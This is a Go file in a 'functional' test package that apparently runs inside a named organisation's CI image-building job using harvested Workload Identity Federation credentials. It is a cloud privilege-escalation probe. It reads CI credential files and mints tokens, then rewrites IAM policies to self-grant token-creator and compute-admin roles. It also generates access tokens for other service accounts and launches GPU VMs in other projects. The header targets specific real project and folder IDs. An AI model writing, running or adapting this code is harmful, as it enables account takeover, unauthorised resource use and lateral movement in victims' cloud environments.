//go:build functional

// C211 i124308 shared stdlib WIF+HTTP helper library (derived from the proven i124122 helper file) (self-contained; no other c211 files
// required). Runs inside the dominodatalab/hephaestus "GKE image building" job
// after google-github-actions/auth@v2 exported a Workload Identity Federation
// credential file, i.e. as the harvested WIF service account.
//
// Question: does the identity's proven resourcemanager.projects.setIamPolicy on
// projects/153711203585 reach the parent folder (121299922366), the
// organization, sibling projects, or other service accounts in the project?
//
// Phases:
//   A. mint the WIF access token with the Go standard library (STS + SA impers.)
//   B. project getAncestry -> folder / organization ids
//   C. projects.getIamPolicy v1 (full bindings verbatim) + v3 status
//   D. per-permission testIamPermissions on project, folder, organization
//   E. folder + organization IAM policy read when allowed
//   F. list projects parented by the folder, folders under it, org hierarchy
//   G. list iam serviceAccounts in the project, self-grant
//      roles/iam.serviceAccountTokenCreator, then generateAccessToken for EVERY
//      service account and re-test resource reach with each SA token
//   H. if folder/org setIamPolicy is allowed: grant roles/compute.admin to the
//      WIF SA at that scope, re-test sibling projects, then revert the binding
//   I. for every NEW project (not 153711203585) where compute.instances.create
//      is allowed: read NVIDIA quota and create EXACTLY ONE on-demand T4 marker
//      with serial-console nvidia-smi UUID proof, delete it and prove absence.
//
// Exactly one marker at a time, always deleted. Every refusal is printed
// verbatim as GATE evidence. No secret value is printed (tokens are reported as
// length + SHA-256 prefix only).
package functional

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

const c211xScope = "https://www.googleapis.com/auth/cloud-platform"

var c211xClient = &http.Client{Timeout: 120 * time.Second}
var c211xUUIDRe = regexp.MustCompile(`GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)

func c211xEmit(section, body string) {
	fmt.Printf("\n=== C211X %s BEGIN ===\n%s\n=== C211X %s END ===\n", section, body, section)
}

func c211xTrunc(s string, n int) string {
	s = strings.TrimRight(s, "\n")
	if len(s) <= n {
		return s
	}
	return s[:n] + "\n...[truncated total_len=" + strconv.Itoa(len(s)) + "]"
}

func c211xShort(s string) string {
	if s == "" {
		return "<absent>"
	}
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("len=%d sha256=%x", len(s), h[:8])
}

func c211xHTTP(method, u, token, ctype, body string) (int, string) {
	var rd io.Reader
	if body != "" {
		rd = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rd)
	if err != nil {
		return -1, "request build error: " + c211xTrunc(err.Error(), 300)
	}
	req.Header.Set("User-Agent", "c211-i120387-iamx-probe")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	if ctype != "" {
		req.Header.Set("Content-Type", ctype)
	}
	resp, err := c211xClient.Do(req)
	if err != nil {
		return -1, "transport error: " + c211xTrunc(err.Error(), 400)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	return resp.StatusCode, string(b)
}

func c211xJSON(s string) map[string]interface{} {
	var m map[string]interface{}
	if json.Unmarshal([]byte(s), &m) != nil {
		return nil
	}
	return m
}

func c211xStr(m map[string]interface{}, k string) string {
	if m == nil {
		return ""
	}
	if v, ok := m[k].(string); ok {
		return v
	}
	return ""
}

func c211xJSONString(v interface{}) string {
	b, err := json.Marshal(v)
	if err != nil {
		return "{\"marshal_error\":true}"
	}
	return string(b)
}

func c211xFirst(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// WIF credential handling (stdlib only)
// ---------------------------------------------------------------------------

type c211xCreds struct {
	raw         map[string]interface{}
	typ         string
	audience    string
	subjectType string
	tokenURL    string
	impersonate string
	srcURL      string
	srcHeaders  map[string]interface{}
	srcFormat   string
	srcField    string
	saEmail     string
	projNumber  string
	credProjID  string
}

func c211xLoadCreds() (*c211xCreds, string) {
	cands := []string{}
	for _, n := range []string{"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_GHA_CREDS_PATH", "CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE"} {
		if v := os.Getenv(n); v != "" {
			cands = append(cands, v)
		}
	}
	for _, pat := range []string{
		"/home/runner/work/*/*/gha-creds-*.json",
		"/home/runner/work/_temp/gha-creds-*.json",
		"gha-creds-*.json",
	} {
		if m, _ := filepath.Glob(pat); len(m) > 0 {
			cands = append(cands, m...)
		}
	}
	seen := map[string]bool{}
	var log strings.Builder
	for _, p := range cands {
		if seen[p] {
			continue
		}
		seen[p] = true
		b, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		var m map[string]interface{}
		if json.Unmarshal(b, &m) != nil {
			continue
		}
		c := &c211xCreds{raw: m}
		c.typ = c211xStr(m, "type")
		c.audience = c211xStr(m, "audience")
		c.subjectType = c211xStr(m, "subject_token_type")
		c.tokenURL = c211xStr(m, "token_url")
		c.impersonate = c211xStr(m, "service_account_impersonation_url")
		c.credProjID = c211xStr(m, "project_id")
		if cs, ok := m["credential_source"].(map[string]interface{}); ok {
			c.srcURL = c211xStr(cs, "url")
			c.srcHeaders, _ = cs["headers"].(map[string]interface{})
			if f, ok := cs["format"].(map[string]interface{}); ok {
				c.srcFormat = c211xStr(f, "type")
				c.srcField = c211xStr(f, "subject_token_field_name")
			}
		}
		if c.impersonate != "" {
			if i := strings.Index(c.impersonate, "serviceAccounts/"); i >= 0 {
				rest := c.impersonate[i+len("serviceAccounts/"):]
				if j := strings.Index(rest, ":"); j >= 0 {
					rest = rest[:j]
				}
				c.saEmail = rest
			}
		}
		if re := regexp.MustCompile(`projects/([0-9]+)/`); re.MatchString(c.audience) {
			c.projNumber = re.FindStringSubmatch(c.audience)[1]
		}
		fmt.Fprintf(&log, "SELECTED credpath=%s size=%d type=%s\n", p, len(b), c.typ)
		fmt.Fprintf(&log, "audience=%s\n", c.audience)
		fmt.Fprintf(&log, "service_account_email=%s\n", c.saEmail)
		fmt.Fprintf(&log, "impersonation_url=%s\n", c211xTrunc(c.impersonate, 300))
		return c, log.String()
	}
	return nil, log.String()
}

func c211xFetchSubjectToken(c *c211xCreds) (string, string) {
	u := c.srcURL
	if u == "" {
		return "", "no credential_source.url in credentials file"
	}
	if c.audience != "" && !strings.Contains(u, "audience=") {
		sep := "?"
		if strings.Contains(u, "?") {
			sep = "&"
		}
		u = u + sep + "audience=" + url.QueryEscape(c.audience)
	}
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return "", "subject token request build error: " + err.Error()
	}
	req.Header.Set("User-Agent", "c211-i120387")
	for k, v := range c.srcHeaders {
		if s, ok := v.(string); ok {
			req.Header.Set(k, s)
		}
	}
	resp, err := c211xClient.Do(req)
	if err != nil {
		return "", "subject token transport error: " + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	body := strings.TrimSpace(string(b))
	if resp.StatusCode != 200 {
		return "", fmt.Sprintf("subject token endpoint status=%d verbatim=%s", resp.StatusCode, c211xTrunc(body, 800))
	}
	tok := body
	if strings.HasPrefix(body, "{") {
		if m := c211xJSON(body); m != nil {
			if v, ok := m["value"].(string); ok {
				tok = v
			}
		}
	}
	return tok, fmt.Sprintf("subject token endpoint status=200 extracted_%s", c211xShort(tok))
}

func c211xSTSExchange(c *c211xCreds, subject string) (string, string) {
	tu := c.tokenURL
	if tu == "" {
		tu = "https://sts.googleapis.com/v1/token"
	}
	form := url.Values{}
	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:token-exchange")
	form.Set("audience", c.audience)
	form.Set("scope", c211xScope)
	form.Set("requested_token_type", "urn:ietf:params:oauth:token-type:access_token")
	stt := c.subjectType
	if stt == "" {
		stt = "urn:ietf:params:oauth:token-type:jwt"
	}
	form.Set("subject_token_type", stt)
	form.Set("subject_token", subject)
	st, body := c211xHTTP("POST", tu, "", "application/x-www-form-urlencoded", form.Encode())
	m := c211xJSON(body)
	at := c211xStr(m, "access_token")
	msg := fmt.Sprintf("STS POST %s -> %d", tu, st)
	if at != "" {
		return at, msg + fmt.Sprintf(" access_token_%s expires_in=%v", c211xShort(at), m["expires_in"])
	}
	if e := c211xStr(m, "error"); e != "" {
		msg += fmt.Sprintf(" error=%s error_description=%s", e, c211xStr(m, "error_description"))
	}
	return "", msg + " verbatim=" + c211xTrunc(body, 1200)
}

func c211xImpersonate(c *c211xCreds, fedToken string) (string, string) {
	if c.impersonate == "" {
		return fedToken, "no impersonation url; using federated token"
	}
	body := fmt.Sprintf(`{"scope":["%s"],"lifetime":"3600s"}`, c211xScope)
	st, rb := c211xHTTP("POST", c.impersonate, fedToken, "application/json", body)
	m := c211xJSON(rb)
	at := c211xStr(m, "accessToken")
	msg := fmt.Sprintf("impersonation POST %s -> %d", c.impersonate, st)
	if at != "" {
		return at, msg + fmt.Sprintf(" accessToken_%s expireTime=%s", c211xShort(at), c211xStr(m, "expireTime"))
	}
	if emap, ok := m["error"].(map[string]interface{}); ok {
		msg += " error_message=" + c211xStr(emap, "message")
	}
	return "", msg + " verbatim=" + c211xTrunc(rb, 1200)
}

func c211xMint() (string, string, string) {
	creds, credLog := c211xLoadCreds()
	if creds == nil {
		return "", "", "credential file not found: " + credLog
	}
	var log strings.Builder
	fmt.Fprintf(&log, "%s", credLog)
	subject, subjMsg := c211xFetchSubjectToken(creds)
	fmt.Fprintf(&log, "subject: %s\n", subjMsg)
	if subject != "" {
		if fed, stsMsg := c211xSTSExchange(creds, subject); fed != "" {
			fmt.Fprintf(&log, "sts: %s\n", stsMsg)
			if final, impMsg := c211xImpersonate(creds, fed); final != "" {
				fmt.Fprintf(&log, "impersonate: %s\n", impMsg)
				return final, "stdlib_wif_sts", log.String()
			} else {
				fmt.Fprintf(&log, "impersonate FAILED: %s\n", impMsg)
			}
		} else {
			fmt.Fprintf(&log, "sts FAILED: %s\n", stsMsg)
		}
	}
	return "", "", log.String()
}

// ---------------------------------------------------------------------------
// IAM helpers
// ---------------------------------------------------------------------------

func c211xTestIamBatch(token, resourceURL string, perms []string) ([]string, int, string) {
	b, _ := json.Marshal(map[string]interface{}{"permissions": perms})
	st, body := c211xHTTP("POST", resourceURL+":testIamPermissions", token, "application/json", string(b))
	allowed := []string{}
	if m := c211xJSON(body); m != nil {
		if arr, ok := m["permissions"].([]interface{}); ok {
			for _, v := range arr {
				if s, ok := v.(string); ok {
					allowed = append(allowed, s)
				}
			}
		}
	}
	sort.Strings(allowed)
	return allowed, st, body
}

func c211xTestIamOne(token, resourceURL, perm string) (bool, int, string) {
	al, st, body := c211xTestIamBatch(token, resourceURL, []string{perm})
	for _, a := range al {
		if a == perm {
			return true, st, body
		}
	}
	return false, st, body
}

func c211xGetPolicy(token, resourceURL string) (map[string]interface{}, int, string) {
	body := `{"options":{"requestedPolicyVersion":3}}`
	st, rb := c211xHTTP("POST", resourceURL+":getIamPolicy", token, "application/json", body)
	if st != 200 {
		return nil, st, rb
	}
	return c211xJSON(rb), st, rb
}

func c211xSetPolicy(token, resourceURL string, pol map[string]interface{}) (int, string) {
	b, _ := json.Marshal(map[string]interface{}{"policy": pol})
	return c211xHTTP("POST", resourceURL+":setIamPolicy", token, "application/json", string(b))
}

func c211xAddBinding(pol map[string]interface{}, role, member string) bool {
	if pol == nil {
		return false
	}
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211xStr(bm, "role") != role {
			continue
		}
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return false
			}
		}
		bm["members"] = append(members, member)
		return true
	}
	pol["bindings"] = append(bindings, map[string]interface{}{"role": role, "members": []interface{}{member}})
	return true
}

func c211xRemoveBinding(pol map[string]interface{}, role, member string) bool {
	if pol == nil {
		return false
	}
	bindings, _ := pol["bindings"].([]interface{})
	out := []interface{}{}
	removed := false
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211xStr(bm, "role") != role {
			out = append(out, b)
			continue
		}
		members, _ := bm["members"].([]interface{})
		nm := []interface{}{}
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				removed = true
				continue
			}
			nm = append(nm, m)
		}
		if len(nm) > 0 {
			bm["members"] = nm
			out = append(out, bm)
		}
	}
	pol["bindings"] = out
	return removed
}

func c211xPolicyDump(pol map[string]interface{}) string {
	if pol == nil {
		return "<nil policy>"
	}
	var sb strings.Builder
	bindings, _ := pol["bindings"].([]interface{})
	fmt.Fprintf(&sb, "version=%v etag=%v bindings=%d\n", pol["version"], pol["etag"], len(bindings))
	lines := []string{}
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		role := c211xStr(bm, "role")
		members, _ := bm["members"].([]interface{})
		ms := []string{}
		for _, m := range members {
			if s, ok := m.(string); ok {
				ms = append(ms, s)
			}
		}
		sort.Strings(ms)
		lines = append(lines, fmt.Sprintf("BIND role=%s members=%d [%s]", role, len(ms), strings.Join(ms, " ")))
	}
	sort.Strings(lines)
	for _, l := range lines {
		fmt.Fprintf(&sb, "%s\n", l)
	}
	return sb.String()
}

// ---------------------------------------------------------------------------
// Resource listing
// ---------------------------------------------------------------------------

type c211xProj struct {
	id     string
	number string
	name   string
	state  string
	parent string
}

func c211xListProjectsV1(token string) ([]c211xProj, int, string) {
	out := []c211xProj{}
	st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100", token, "", "")
	if st != 200 {
		return out, st, body
	}
	m := c211xJSON(body)
	if items, ok := m["projects"].([]interface{}); ok {
		for _, it := range items {
			im, _ := it.(map[string]interface{})
			par := ""
			if p, ok := im["parent"].(map[string]interface{}); ok {
				par = c211xStr(p, "type") + "/" + c211xStr(p, "id")
			}
			out = append(out, c211xProj{
				id:     c211xStr(im, "projectId"),
				number: c211xStr(im, "projectNumber"),
				name:   c211xStr(im, "name"),
				state:  c211xStr(im, "lifecycleState"),
				parent: par,
			})
		}
	}
	return out, st, body
}

func c211xListProjectsV3(token, parent string) ([]c211xProj, int, string) {
	out := []c211xProj{}
	pageTok := ""
	lastStatus := 0
	lastBody := ""
	for page := 0; page < 10; page++ {
		u := "https://cloudresourcemanager.googleapis.com/v3/projects?parent=" + url.QueryEscape(parent) + "&pageSize=100"
		if pageTok != "" {
			u += "&pageToken=" + url.QueryEscape(pageTok)
		}
		st, body := c211xHTTP("GET", u, token, "", "")
		lastStatus, lastBody = st, body
		if st != 200 {
			break
		}
		m := c211xJSON(body)
		if items, ok := m["projects"].([]interface{}); ok {
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				out = append(out, c211xProj{
					id:     c211xStr(im, "projectId"),
					number: c211xStr(im, "projectNumber"),
					name:   c211xStr(im, "displayName"),
					state:  c211xStr(im, "state"),
					parent: c211xStr(im, "parent"),
				})
			}
		}
		pageTok = c211xStr(m, "nextPageToken")
		if pageTok == "" {
			break
		}
	}
	return out, lastStatus, lastBody
}

type c211xFolder struct {
	name    string
	display string
	state   string
	parent  string
}

func c211xListFolders(token, parent string) ([]c211xFolder, int, string) {
	out := []c211xFolder{}
	st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/folders?parent="+url.QueryEscape(parent)+"&pageSize=100", token, "", "")
	if st != 200 {
		return out, st, body
	}
	m := c211xJSON(body)
	if items, ok := m["folders"].([]interface{}); ok {
		for _, it := range items {
			im, _ := it.(map[string]interface{})
			out = append(out, c211xFolder{
				name:    c211xStr(im, "name"),
				display: c211xStr(im, "displayName"),
				state:   c211xStr(im, "state"),
				parent:  c211xStr(im, "parent"),
			})
		}
	}
	return out, st, body
}

// ---------------------------------------------------------------------------
// Service accounts / impersonation
// ---------------------------------------------------------------------------

func c211xListServiceAccounts(token, proj string) ([]map[string]interface{}, int, string) {
	out := []map[string]interface{}{}
	pageTok := ""
	lastStatus := 0
	lastBody := ""
	for page := 0; page < 10; page++ {
		u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(proj) + "/serviceAccounts?pageSize=100"
		if pageTok != "" {
			u += "&pageToken=" + url.QueryEscape(pageTok)
		}
		st, body := c211xHTTP("GET", u, token, "", "")
		lastStatus, lastBody = st, body
		if st != 200 {
			break
		}
		m := c211xJSON(body)
		if items, ok := m["accounts"].([]interface{}); ok {
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				out = append(out, im)
			}
		}
		pageTok = c211xStr(m, "nextPageToken")
		if pageTok == "" {
			break
		}
	}
	return out, lastStatus, lastBody
}

func c211xGenerateAccessToken(token, email string) (string, int, string) {
	body := fmt.Sprintf(`{"scope":["%s"],"lifetime":"1800s"}`, c211xScope)
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	st, rb := c211xHTTP("POST", u, token, "application/json", body)
	m := c211xJSON(rb)
	return c211xStr(m, "accessToken"), st, rb
}

func c211xTokenInfo(token string) (int, string) {
	st, body := c211xHTTP("GET", "https://oauth2.googleapis.com/tokeninfo?access_token="+url.QueryEscape(token), "", "", "")
	return st, body
}

// ---------------------------------------------------------------------------
// Compute: quota + single marker
// ---------------------------------------------------------------------------

func c211xRegionOfZone(zone string) string {
	parts := strings.Split(zone, "-")
	if len(parts) >= 3 {
		return parts[0] + "-" + parts[1]
	}
	return zone
}

func c211xStartupScript() string {
	return `#!/bin/bash
exec > /dev/console 2>&1
echo C211X_START
cat > /usr/local/bin/c211x-put.py <<'EOP'
import sys, urllib.request
val = sys.stdin.read()[:2000]
req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211x-result", data=val.encode(), method="PUT", headers={"Metadata-Flavor": "Google"})
try:
    urllib.request.urlopen(req, timeout=15).read()
    print("C211X_PUT_OK")
except Exception as e:
    print("C211X_PUT_ERR", repr(e)[:200])
EOP
cat > /usr/local/bin/c211x-helper.sh <<'EOS'
#!/bin/bash
exec > /dev/console 2>&1
echo C211X_HELPER_START
put() { echo "$1" | python3 /usr/local/bin/c211x-put.py; }
PCIDEV=$(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo "$(basename $f):dev=$(cat $f/device 2>/dev/null)"; fi; done | tr '\n' ' ')
echo C211X_PCI "$PCIDEV"
put "STAGE=boot pci=$PCIDEV helper_started=$(date -u +%H:%M:%S)"
export DEBIAN_FRONTEND=noninteractive
if ! command -v nvidia-smi >/dev/null 2>&1; then
  echo C211X_INSTALLING_DRIVER
  (apt-get update -qq && apt-get install -y -qq linux-headers-$(uname -r) nvidia-driver-535) > /var/log/c211x-apt.log 2>&1
  RC=$?
  echo C211X_APT_RC=$RC
  put "STAGE=apt rc=$RC tail=$(tail -c 400 /var/log/c211x-apt.log | tr '\n' '|')"
  if ! command -v nvidia-smi >/dev/null 2>&1; then
    (apt-get install -y -qq linux-headers-$(uname -r) nvidia-driver-535-server) >> /var/log/c211x-apt.log 2>&1
    echo C211X_APT2_RC=$?
    put "STAGE=apt2 tail=$(tail -c 400 /var/log/c211x-apt.log | tr '\n' '|')"
  fi
fi
modprobe nvidia 2>/dev/null || true
for i in $(seq 1 90); do
  if nvidia-smi -L > /tmp/c211x-smi.txt 2>&1; then
    echo C211X_GPU_READY
    cat /tmp/c211x-smi.txt
    put "STAGE=gpu_ready smi=$(cat /tmp/c211x-smi.txt | tr '\n' '|')"
    nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader > /tmp/c211x-uuid.txt 2>&1
    cat /tmp/c211x-uuid.txt
    put "STAGE=uuid uuid_line=$(cat /tmp/c211x-uuid.txt | tr '\n' '|')"
    echo C211X_DONE
    exit 0
  fi
  echo attempt=$i "$(head -c 200 /tmp/c211x-smi.txt | tr '\n' ' ')"
  if [ $((i % 5)) -eq 0 ]; then put "STAGE=retry i=$i smi=$(head -c 300 /tmp/c211x-smi.txt | tr '\n' '|')"; fi
  sleep 10
done
put "STAGE=failed smi=$(head -c 500 /tmp/c211x-smi.txt | tr '\n' '|')"
echo C211X_FAILED
echo C211X_DONE
EOS
chmod +x /usr/local/bin/c211x-helper.sh /usr/local/bin/c211x-put.py
LAUNCH=0
if command -v systemd-run >/dev/null 2>&1; then
  systemd-run --unit=c211x-helper --collect /usr/local/bin/c211x-helper.sh && LAUNCH=1
fi
if [ "$LAUNCH" = "0" ]; then
  setsid nohup /usr/local/bin/c211x-helper.sh >/dev/null 2>&1 &
fi
echo C211X_LAUNCHED=$LAUNCH
echo C211X_START_DONE
`
}

func c211xImageUsable(token, project, family string) (bool, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + project + "/global/images/family/" + family
	st, body := c211xHTTP("GET", u, token, "", "")
	return st == 200, fmt.Sprintf("%s/%s status=%d verbatim=%s", project, family, st, c211xTrunc(body, 300))
}

func c211xRegionQuotaRows(token, proj, region string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + region
	st, body := c211xHTTP("GET", u, token, "", "")
	rows := []string{}
	if st != 200 {
		return rows, st, body
	}
	m := c211xJSON(body)
	quotas, _ := m["quotas"].([]interface{})
	for _, q := range quotas {
		qm, _ := q.(map[string]interface{})
		metric := c211xStr(qm, "metric")
		if !strings.Contains(metric, "NVIDIA") {
			continue
		}
		limit, _ := qm["limit"].(float64)
		usage, _ := qm["usage"].(float64)
		if limit <= 0 {
			continue
		}
		rows = append(rows, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, limit, usage))
	}
	sort.Strings(rows)
	return rows, st, body
}

func c211xAccelTypes(token, proj, zone string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/acceleratorTypes?fields=items/name&maxResults=100"
	st, body := c211xHTTP("GET", u, token, "", "")
	out := []string{}
	if st != 200 {
		return out, st, body
	}
	m := c211xJSON(body)
	if items, ok := m["items"].([]interface{}); ok {
		for _, it := range items {
			im, _ := it.(map[string]interface{})
			if n := c211xStr(im, "name"); n != "" {
				out = append(out, n)
			}
		}
	}
	sort.Strings(out)
	return out, st, body
}

func c211xCreateGPUInstance(token, proj, zone, name, saEmail, imageProject, imageFamily string) (int, string) {
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/n1-standard-4",
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + imageProject + "/global/images/family/" + imageFamily,
				"diskSizeGb":  "60",
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "projects/" + proj + "/global/networks/default",
			"subnetwork": "projects/" + proj + "/regions/" + c211xRegionOfZone(zone) + "/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/nvidia-tesla-t4",
			"acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{
			"items": []interface{}{
				map[string]interface{}{"key": "startup-script", "value": c211xStartupScript()},
				map[string]interface{}{"key": "c211x", "value": "i120387"},
			},
		},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  saEmail,
			"scopes": []string{c211xScope},
		}},
		"labels": map[string]string{"c211": "i120387"},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	return c211xHTTP("POST", u, token, "application/json", string(b))
}

func c211xInstanceGet(token, proj, zone, name string) (int, map[string]interface{}, string) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	return st, c211xJSON(body), body
}

func c211xMetaValue(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	md, _ := m["metadata"].(map[string]interface{})
	if md == nil {
		return ""
	}
	items, _ := md["items"].([]interface{})
	for _, it := range items {
		im, _ := it.(map[string]interface{})
		if c211xStr(im, "key") == key {
			return c211xStr(im, "value")
		}
	}
	return ""
}

// c211xMarker creates ONE on-demand T4 VM in proj/zone and returns (uuid, log).
// The VM is always deleted and absence is proven.
func c211xMarker(token, proj, zone, name, saEmail, imgProject, imgFamily string) (string, string, bool) {
	var vlog strings.Builder
	cst, cbody := c211xCreateGPUInstance(token, proj, zone, name, saEmail, imgProject, imgFamily)
	fmt.Fprintf(&vlog, "INSTANCE create proj=%s zone=%s name=%s image=%s/%s status=%d\nverbatim=%s\n",
		proj, zone, name, imgProject, imgFamily, cst, c211xTrunc(cbody, 2000))
	uuid := ""
	metaFinal := ""
	lastState := ""
	if cst == 200 {
		for i := 0; i < 80; i++ {
			ist, im, _ := c211xInstanceGet(token, proj, zone, name)
			lastState = ""
			if ist == 200 && im != nil {
				lastState = c211xStr(im, "status")
				if v := c211xMetaValue(im, "c211x-result"); v != "" {
					metaFinal = v
				}
			}
			ps, pb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", token, "", "")
			content := ""
			if ps == 200 {
				if m := c211xJSON(pb); m != nil {
					content = c211xStr(m, "contents")
				} else {
					content = pb
				}
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
				if u := c211xUUIDRe.FindString(metaFinal); u != "" {
					uuid = u
				}
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d bytes=%d uuid=%s tail=%s\n",
					i, lastState, ps, len(content), uuid,
					c211xTrunc(content[maxi(0, len(content)-300):], 300))
			} else {
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d verbatim=%s\n", i, lastState, ps, c211xTrunc(pb, 300))
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") || strings.Contains(content, "C211X_FAILED") {
				break
			}
			time.Sleep(15 * time.Second)
		}
	}
	dst, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	fmt.Fprintf(&vlog, "INSTANCE delete status=%d verbatim=%s\n", dst, c211xTrunc(db, 600))
	absent := false
	for i := 0; i < 12; i++ {
		time.Sleep(10 * time.Second)
		ist, _, ib := c211xInstanceGet(token, proj, zone, name)
		fmt.Fprintf(&vlog, "ABSENCE readback=%d http=%d verbatim=%s\n", i, ist, c211xTrunc(ib, 300))
		if ist == 404 {
			absent = true
			break
		}
	}
	lst, lb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter=name%3D"+url.QueryEscape(name), token, "", "")
	fmt.Fprintf(&vlog, "AGGREGATED_LIST status=%d verbatim=%s\n", lst, c211xTrunc(lb, 600))
	fmt.Fprintf(&vlog, "MARKER_RESULT uuid=%s final_state=%s meta=%s delete_status=%d absent=%v\n", uuid, lastState, c211xTrunc(metaFinal, 400), dst, absent)
	return uuid, vlog.String(), absent
}

func maxi(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// ---------------------------------------------------------------------------
// Main probe
// ---------------------------------------------------------------------------


func c211xContains(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}

func c211xPolicyHas(pol map[string]interface{}, role, member string) bool {
	if pol == nil {
		return false
	}
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211xStr(bm, "role") != role {
			continue
		}
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return true
			}
		}
	}
	return false
}

func c211xGetPolicyBody(token, resourceURL string) (int, string) {
	body := `{"options":{"requestedPolicyVersion":3}}`
	st, rb := c211xHTTP("POST", resourceURL+":getIamPolicy", token, "application/json", body)
	return st, rb
}

func c211xListRegions(token, proj string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions?maxResults=100&fields=items/name"
	st, body := c211xHTTP("GET", u, token, "", "")
	out := []string{}
	if st != 200 {
		return out, st, body
	}
	m := c211xJSON(body)
	if items, ok := m["items"].([]interface{}); ok {
		for _, it := range items {
			im, _ := it.(map[string]interface{})
			if n := c211xStr(im, "name"); n != "" {
				out = append(out, n)
			}
		}
	}
	sort.Strings(out)
	return out, st, body
}
